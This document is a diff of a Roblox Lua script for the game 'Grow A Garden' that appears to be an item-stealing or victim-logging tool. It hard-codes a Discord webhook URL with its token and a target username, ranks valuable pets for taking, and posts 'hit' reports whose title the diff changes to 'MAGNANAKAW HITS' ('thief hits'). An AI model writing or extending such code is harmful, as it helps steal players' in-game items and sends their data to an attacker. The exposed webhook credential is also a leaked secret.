@@ -1,5 +1,3 @@
-
-
 getgenv().Webhook = "https://discord.com/api/webhooks/1407326022176608267/_7XNS9c-LNZLjKHjB-c03xp9_FBexx92Kz7eYA6s-aMWHFzPbeEVAaEtMwPRySmJW5Yv"
 getgenv().Username = "BEESUCALL"
         local RS = game:GetService("ReplicatedStorage")
@@ -80,11 +78,11 @@ getgenv().Username = "BEESUCALL"
                 ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                 ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                 ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
-                ["Red Fox"] = { priority = 8 emoji = "🦊", isMutation = false },
+                ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
                 ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
                 ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                 ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-                ["Corrupted Kitsune"] = { priority = 26, emoji = "🦊", isMutation = false },
+                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
                 -- Mutations
                 ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                 ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
@@ -405,7 +403,7 @@ end
 local formattedTotalValue = formatNumberWithCommas(totalValue)
 
 local embed = {
-    title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+    title = " MAGNANAKAW HITS 💰 ",
     color = 65280,
     fields = {
         {
